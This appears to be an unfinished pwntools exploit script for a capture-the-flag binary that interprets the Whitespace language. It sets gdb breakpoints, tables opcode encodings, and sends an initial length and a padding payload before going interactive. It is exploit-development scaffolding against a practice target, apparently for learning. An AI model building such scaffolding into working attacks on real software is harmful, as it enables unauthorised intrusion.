from pwn import *

e = ELF('./whitespace')
libc = ELF('./libc-2.23.so')

r = process(e.path, env={ 'LD_PRELOAD': libc.path })

gdbscript = """
b * main
b * read_source
b * initialize_stack
b * create_instruction_set
b * create_heap
b * main + 95
b * main + 282
"""

# Actual instructions
isa1 = ["\x20\x20", "\x20\x0a\x20", "\x20\x09\x20", "\x20\x0a\x09", "\x20\x0a\x0a", "\x20\x09\x0a", "\t   ", "\t  \t", "\t  \n", "\t \t ", "\t \t\t", "\t\t ", "\t\t\t", "\n  ", "\n \t", "\n \n", "\n\t ", "\n\t\t", "\n\t\n", "\n\n\n", "\t\n  ", "\t\n \t", "\t\n\t ", "\t\n\t\t"]

# Instruction name
isa2 = ["ws_stack_push", "ws_stack_dup", 'ws_stack_copy', 'ws_stack_swap', 'ws_stack_discard', 'ws_stack_slide', 'ws_math_add', 'ws_math_sub', 'ws_math_mult', 'ws_math_div', 'ws_math_mod', 'ws_heap_store', 'ws_heap_retrieve', 'ws_flow_mark', 'ws_flow_call', 'ws_flow_jump', 'ws_flow_jz', 'ws_flow_jn', 'ws_flow_ret', 'ws_flow_exit', 'ws_io_outc', 'ws_io_outn', 'ws_io_inc', 'ws_io_inn']

# Instruction length
isa3 = [2, 3, 3, 3, 3, 3, 4, 4, 4, 4, 4, 3, 3, 3, 3, 3, 3, 3, 3, 3, 4, 4, 4, 4]

def callFunc(funcName, param1, param2=None):
    for i in range(len(isa2)):
        if funcName == isa2[i]:
            return isa1[i] + param1 + (param2 if param2 != None else "")
    return ""

gdb.attach(r, gdbscript=gdbscript)

len = 0x10
payload = p64(len)
r.send(payload)

payload = ' ' * len
r.send(payload)
r.interactive()

r.close()
